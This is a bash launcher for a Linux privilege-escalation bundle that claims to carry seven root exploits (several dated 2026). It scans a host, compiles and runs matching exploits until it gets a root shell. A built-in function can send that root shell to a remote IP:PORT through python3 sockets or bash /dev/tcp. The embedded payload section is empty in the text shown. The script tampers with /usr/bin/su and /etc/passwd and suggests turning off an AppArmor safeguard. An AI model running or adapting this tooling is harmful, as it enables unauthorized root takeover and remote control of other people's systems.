#!/usr/bin/env bash
# =============================================================================
#  lpe_all.sh - Linux LPE bundle: scan + run (self-contained)
#
#  Bundles 7 public root-LPE PoCs. Extracts, builds, scans the host, and runs
#  the exploits that match this machine until one drops a root shell.
#
#  Bundled exploits:
#    [01] CVE-2026-46331  act_pedit partial-COW page-cache LPE   (x86_64, userns)
#    [02] CVE-2026-43494  io_uring/RDS pin-counting LPE          (x86_64)
#    [03] Fragnesia       ESP-in-TCP page-cache replacement      (x86_64, userns)
#    [04] dirtyfrag       XFRM-ESP / rxrpc-rxkad LPE (arm64)     (aarch64)
#    [05] dirtyfrag       XFRM-ESP / rxrpc-rxkad LPE (x86_64)    (x86_64)
#    [06] CVE-2026-41651  PackageKit TOCTOU race -> SUID root    (PackageKit+GI)
#    [07] CVE-2026-31431  copy_fail AF_ALG splice LPE            (x86_64)
#
#  WARNING: these are weaponized PoCs. Several corrupt /usr/bin/su or
#  /etc/passwd in page cache (persisting until reboot / drop_caches) and one
#  can leave a real entry in /etc/passwd. USE ONLY ON SYSTEMS YOU OWN OR ARE
#  AUTHORIZED TO TEST.
#
#  Usage:
#    ./lpe_all.sh                 scan, then run matching exploits
#    ./lpe_all.sh --scan-only     just report host info + candidates
#    ./lpe_all.sh --exploit 05    run a single exploit id
#    ./lpe_all.sh --timeout 120   per-exploit timeout in seconds (default 90)
#    ./lpe_all.sh --keep          keep build dir after run
#    ./lpe_all.sh --revshell IP PORT
#        instead of a local shell, the root shell connects back to
#        IP:PORT (start the listener with: ./revshell.sh listen PORT)
# =============================================================================

set -u

EXPLOIT_TIMEOUT="${LPE_TIMEOUT:-90}"
SCAN_ONLY=0
BUILD_ONLY=0
REVSHELL=0
RHOST=""
RPORT=""
ONLY=""
KEEP=0
HAS_ROOT=0
[ "$(id -u)" -eq 0 ] && HAS_ROOT=1

while [ $# -gt 0 ]; do
    case "$1" in
        --scan-only|--probe|--dry-run) SCAN_ONLY=1 ;;
        --exploit) ONLY="${2:-}"; shift ;;
        --timeout) EXPLOIT_TIMEOUT="${2:-90}"; shift ;;
        --keep)    KEEP=1 ;;
        --build-only) BUILD_ONLY=1 ;;
        --revshell) REVSHELL=1; RHOST="${2:-}"; RPORT="${3:-}"; shift 2 ;;
        -h|--help) sed -n '2,40p' "$0"; exit 0 ;;
        *) echo "[!] unknown arg: $1"; exit 1 ;;
    esac
    shift
done

# ---- colours ----
C() { [ -t 1 ] && printf '\033[%sm' "$1" || true; }
RED=$(C '1;31'); GRN=$(C '1;32'); YEL=$(C '1;33'); CYN=$(C '1;36'); BLU=$(C '1;34'); RST=$(C '0')

say()  { printf '%s\n' "$*"; }
info() { printf '%s[*]%s %s\n' "$CYN" "$RST" "$*"; }
ok()   { printf '%s[+]%s %s\n' "$GRN" "$RST" "$*"; }
warn() { printf '%s[!]%s %s\n' "$YEL" "$RST" "$*"; }
err()  { printf '%s[-]%s %s\n' "$RED" "$RST" "$*"; }

# reverse-shell command fed to the root shell (python3 -> bash /dev/tcp)
rh_cmd() {
    local ip="$1" port="$2"
    local py='import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    printf "{ command -v python3 >/dev/null 2>&1 && python3 -c '%s'; } || { bash -i >& /dev/tcp/%s/%s 0>&1; }" "$py" "$ip" "$port"
}

# ---- workspace ----
pick_workdir() {
    for d in "${LPE_WORKDIR:-}" "$HOME/.cache/lpe_bundle" /var/tmp/lpe_bundle /dev/shm/lpe_bundle /tmp/lpe_bundle; do
        [ -n "$d" ] || continue
        if [ -d "$d" ] || mkdir -p "$d" 2>/dev/null; then
            if [ -x "$d" ]; then WORKDIR="$d"; return 0; fi
        fi
    done
    return 1
}
pick_workdir || { err "no usable workdir"; exit 1; }
SRCDIR="$WORKDIR/src"; BINDIR="$WORKDIR/bin"; LOGDIR="$WORKDIR/logs"
mkdir -p "$SRCDIR" "$BINDIR" "$LOGDIR"

# ---- self-extract payload ----
extract_sources() {
    local name b64
    awk '/^__PAYLOAD_BELOW__/{f=1;next} f' "$0" | while read -r name b64; do
        printf '%s' "$b64" | base64 -d > "$SRCDIR/$name" 2>/dev/null || { err "extract failed: $name"; exit 1; }
    done
    if [ "$(ls "$SRCDIR" | wc -l)" -ne 7 ]; then err "source extraction incomplete"; exit 1; fi
    chmod 755 "$BINDIR" 2>/dev/null || true
    return 0
}
extract_sources || exit 1

# ---- host scan ----
ARCH=$(uname -m 2>/dev/null | tr '[:upper:]' '[:lower:]')
case "$ARCH" in
    x86_64|amd64) ARCH_ID=x86_64 ;;
    aarch64|arm64) ARCH_ID=aarch64 ;;
    *) ARCH_ID=other ;;
esac
KERNEL=$(uname -r 2>/dev/null)
HOSTNAME=$(hostname 2>/dev/null || uname -n)
DISTRO="unknown"
[ -r /etc/os-release ] && DISTRO=$(. /etc/os-release; echo "${PRETTY_NAME:-unknown}")
USER_UID=$(id -u); USER_NAME=$(id -un)
SU_PATH=""; for p in /usr/bin/su /bin/su; do [ -f "$p" ] && { SU_PATH=$p; break; }; done
HAVE_GCC=no;   command -v gcc  >/dev/null 2>&1 && HAVE_GCC=yes
HAVE_CC=no;    command -v cc   >/dev/null 2>&1 && HAVE_CC=yes
HAVE_PY=no;    command -v python3 >/dev/null 2>&1 && HAVE_PY=yes
HAVE_GI=no;    [ "$HAVE_PY" = yes ] && python3 -c 'import gi' >/dev/null 2>&1 && HAVE_GI=yes
USERNSS=no;    unshare --user --map-root-user true >/dev/null 2>&1 && USERNSS=yes
APPARMOR=0;    [ -r /proc/sys/kernel/apparmor_restrict_unprivileged_userns ] && APPARMOR=$(cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns)
IOURING=unknown; [ -r /proc/sys/kernel/io_uring_disabled ] && IOURING=$(cat /proc/sys/kernel/io_uring_disabled)
AFALG=no;      [ -r /proc/crypto ] && grep -q af_alg /proc/crypto 2>/dev/null && AFALG=yes
PK_KIT=no;     command -v packagekitd >/dev/null 2>&1 && PK_KIT=yes
[ "$PK_KIT" = no ] && pgrep -x packagekitd >/dev/null 2>&1 && PK_KIT=yes

# ---- print scan ----
info "==== scan: $HOSTNAME ===="
say  "  host    : $HOSTNAME"
say  "  arch    : $ARCH        (target id: $ARCH_ID)"
say  "  kernel  : $KERNEL"
say  "  distro  : $DISTRO"
say  "  user    : $USER_NAME (uid=$USER_UID) $([ "$HAS_ROOT" = 1 ] && echo '[ALREADY ROOT]' || echo '[unprivileged]')"
say  "  tools   : gcc=$HAVE_GCC cc=$HAVE_CC python3=$HAVE_PY python3-gi=$HAVE_GI"
say  "  su path : ${SU_PATH:-none}"
say  "  userns  : $USERNSS  (unprivileged user+netns)"
say  "  apparmor unpriv userns restrict: $APPARMOR"
say  "  io_uring_disabled: $IOURING"
say  "  AF_ALG  : $AFALG"
say  "  PackageKit: $PK_KIT"

# ---- candidate selection ----
cands=()
add_cand() { for c in "$@"; do cands+=("$c"); done; }
if [ "$ARCH_ID" = x86_64 ]; then
    add_cand 01 02 03 05 07
    [ "$PK_KIT" = yes ] && add_cand 06
elif [ "$ARCH_ID" = aarch64 ]; then
    add_cand 04
    [ "$PK_KIT" = yes ] && add_cand 06
else
    [ "$PK_KIT" = yes ] && add_cand 06
fi
# keep only requested exploit if --exploit given
if [ -n "$ONLY" ]; then
    cands=("$ONLY")
fi

info "==== candidates: ${cands[*]:-none} ===="
for c in "${cands[@]}"; do
    case "$c" in
        01) say "  [01] CVE-2026-46331  act_pedit COW          $( [ "$USERNSS" = yes ] && echo ok || echo "needs unpriv userns" )" ;;
        02) say "  [02] CVE-2026-43494  io_uring RDS pin-theft $( [ "$IOURING" != "1" ] && echo ok || echo "io_uring disabled" )" ;;
        03) say "  [03] Fragnesia       ESP-in-TCP page-cache $( [ "$USERNSS" = yes ] && echo ok || echo "needs unpriv userns" )" ;;
        04) say "  [04] dirtyfrag (arm64) XFRM-ESP/rxrpc       ok" ;;
        05) say "  [05] dirtyfrag (x86_64) XFRM-ESP/rxrpc      ok" ;;
        06) say "  [06] CVE-2026-41651 PackageKit TOCTOU      $( [ "$HAVE_GI" = yes ] && echo ok || echo "needs python3-gi" )" ;;
        07) say "  [07] CVE-2026-31431 copy_fail AF_ALG        $( [ "$AFALG" = yes ] && echo ok || echo "needs AF_ALG" )" ;;
    esac
done

if [ "$HAS_ROOT" = 1 ]; then
    warn "you are already root - LPE is pointless."
fi
if [ "$SCAN_ONLY" = 1 ] || [ "$HAS_ROOT" = 1 ] || [ "$USER_UID" = 0 ]; then
    [ "$SCAN_ONLY" = 1 ] && ok "scan complete (scan-only mode)"
    exit 0
fi

# ---- compile ----
compile_one() {
    local id="$1"; local src="$2"; local out="$3"; local cmd
    [ -f "$SRCDIR/$src" ] || { err "[$id] source missing"; return 1; }
    case "$id" in
        01) cmd="gcc -O2 -o $out $src" ;;
        02) cmd="gcc -O2 -o $out $src" ;;
        03) cmd="gcc -O2 -static -o $out $src 2>/dev/null || gcc -O2 -o $out $src" ;;
        04) cmd="gcc -O2 -o $out $src" ;;
        05) cmd="gcc -O2 -o $out $src" ;;
    esac
    if (cd "$SRCDIR" && eval "$cmd"); then
        chmod +x "$out" 2>/dev/null || true
        ok "[$id] built -> $(basename "$out")"
        return 0
    fi
    err "[$id] build failed"
    return 1
}

declare -A built
for c in "${cands[@]}"; do
    case "$c" in
        01) compile_one 01 src_01.c "$BINDIR/x01" && built[01]=1 ;;
        02) compile_one 02 src_02.c "$BINDIR/x02" && built[02]=1 ;;
        03) compile_one 03 src_03.c "$BINDIR/x03" && built[03]=1 ;;
        04) compile_one 04 src_04.c "$BINDIR/x04" && built[04]=1 ;;
        05) compile_one 05 src_05.c "$BINDIR/x05" && built[05]=1 ;;
        06) built[06]=1 ;;
        07) built[07]=1 ;;
    esac
done

if [ "$BUILD_ONLY" = 1 ]; then
    ok "build-only mode: binaries built (no exploit executed)"
    exit 0
fi

# ---- run ----
WON=0
run_one() {
    local id="$1" name="$2"; shift 2
    [ "${built[$id]:-0}" = 1 ] || { err "[$id] not available"; return; }
    local log="$LOGDIR/$id.log"
    info "==== [$id] $name ===="
    # feed the root shell a command + exit; capture everything
    local feed="id; exit"
    if [ "$REVSHELL" = 1 ]; then
        feed="id; $(rh_cmd "$RHOST" "$RPORT")"
        info "[$id] sending reverse shell -> ${RHOST}:${RPORT} (listener must be up)"
    fi
    printf '%s\n' "$feed" | (cd "$WORKDIR" && timeout "$EXPLOIT_TIMEOUT" "$@") >"$log" 2>&1
    local rc=$?
    if grep -qaE 'uid=0\(' "$log"; then
        ok "[$id] $name -> ROOT SHELL achieved (uid=0)"
        say "   tail of output:"
        tail -n 8 "$log" | sed 's/^/   /'
        WON=1
        return 0
    fi
    warn "[$id] no root yet (rc=$rc)"
    return 1
}

for c in "${cands[@]}"; do
    case "$c" in
        01) run_one 01 "CVE-2026-46331" "$BINDIR/x01" ;;
        02) run_one 02 "CVE-2026-43494" "$BINDIR/x02" ;;
        03) run_one 03 "Fragnesia"       "$BINDIR/x03" ;;
        04) run_one 04 "dirtyfrag-arm64" "$BINDIR/x04" -v ;;
        05) run_one 05 "dirtyfrag-x86_64" "$BINDIR/x05" -v ;;
        06) run_one 06 "CVE-2026-41651" python3 "$SRCDIR/src_06.py" ;;
        07) run_one 07 "CVE-2026-31431" python3 "$SRCDIR/src_07.py" ;;
    esac
    [ "$WON" = 1 ] && break
done

# ---- summary ----
echo
if [ "$WON" = 1 ]; then
    ok "=== PRIVILEGE ESCALATION SUCCEEDED ==="
    say "  run:  $( [ -n "$ONLY" ] && echo "$ONLY" || echo "see log" )"
else
    err "=== no exploit succeeded on this host ==="
    say "  logs: $LOGDIR"
    say "  hint: unpriv userns = $USERNSS; apparmor userns restrict = $APPARMOR"
    say "        (on Ubuntu with AppArmor, try: sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0)"
    say "        then re-run the kernel-exploit candidates."
fi
say
warn "cleanup note: page-cache corruption of /usr/bin/su clears on reboot or"
warn "  'echo 3 > /proc/sys/vm/drop_caches' (as root). If dirtyfrag used the"
warn "  rxrpc path it may have edited /etc/passwd on disk - inspect and revert it."
[ "$KEEP" = 0 ] && rm -rf "$WORKDIR" && ok "workspace cleaned"

exit $([ "$WON" = 1 ] && echo 0 || echo 1)
__PAYLOAD_BELOW__
